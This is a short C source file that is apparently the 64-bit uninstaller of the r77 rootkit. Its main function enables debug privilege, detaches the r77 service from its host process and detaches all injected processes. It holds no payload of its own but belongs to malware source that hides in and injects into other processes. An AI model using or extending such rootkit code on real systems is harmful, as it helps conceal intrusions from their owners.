#define CUSTOM_ENTRY
#include "r77win.h"
#include "r77process.h"

// Uninstall64.exe is extracted and executed by Uninstall.exe

int main()
{
	EnabledDebugPrivilege();

	// Detach r77 service from its host process.
	DetachR77Service();

	// Detach all injected processes.
	DetachAllInjectedProcesses();

	return 0;
}